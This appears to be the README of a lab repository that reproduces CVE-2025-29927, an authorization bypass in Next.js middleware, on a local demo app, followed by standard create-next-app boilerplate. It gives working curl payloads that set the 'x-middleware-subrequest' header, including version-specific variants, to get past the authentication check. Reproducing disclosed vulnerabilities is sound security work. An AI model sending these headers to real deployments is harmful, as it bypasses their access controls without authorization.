# CVE-2025-29927 Authorization Bypass reproduction

This repository is a reproduction of the [CVE-2025-29927](https://security.snyk.io/vuln/SNYK-JS-NEXT-9508709) vulnerability in the `next` package

## How to reproduce

1. Follow the steps below to clone, and run the Next.js application
2. Test authorization denies access to the `/api/hello` endpoint

```bash
$ curl http://localhost:3000/api/hello

{"error":"Unauthorized"}%
```

3. Test authorization works when token is provided

```bash
$ curl -H "Authorization: my-jwt-token-here" http://localhost:3000/api/hello

{"message":"Hello World"}%
```

4. Now it can also be bypassed if we nest `middleware` 5x times into the special `x-middleware-subrequest` header:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000/api/hello

{"message":"Hello, World"}
```

## CVE-2025-29927 exploitation for older Next.js versions

Next.js 12 and 13 versions used to have a different naming convention for the middleware file (`_middleware.js`), which was changed to `middleware.js` in Next.js 14. This vulnerability can be exploited in older versions by using the `_middleware.js` file.

For example, the following payloads would apply, depending on the Next.js version and your routing convention:

- `curl -H "x-middleware-subrequest: middleware" http://localhost:3000/api/hello` (for Next.js versions 12.2 with the `middleware.js` file in the root of the app, not inside the `pages` directory)
- - `curl -H "x-middleware-subrequest: src/middleware" http://localhost:3000/api/hello`
- `curl -H "x-middleware-subrequest: _middleware" http://localhost:3000/api/hello` (for Next.js versions 11 and up to 12.2)
- `curl -H "x-middleware-subrequest: pages/_middleware" http://localhost:3000/api/hello`
- `curl -H "x-middleware-subrequest: pages/admin/_middleware" http://localhost:3000/api/hello`

## Getting Started

First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

You can start editing the page by modifying `app/page.js`. The page auto-updates as you edit the file.

This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.

## Learn More

To learn more about Next.js, take a look at the following resources:

- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.

You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!

## Deploy on Vercel

The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.

Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
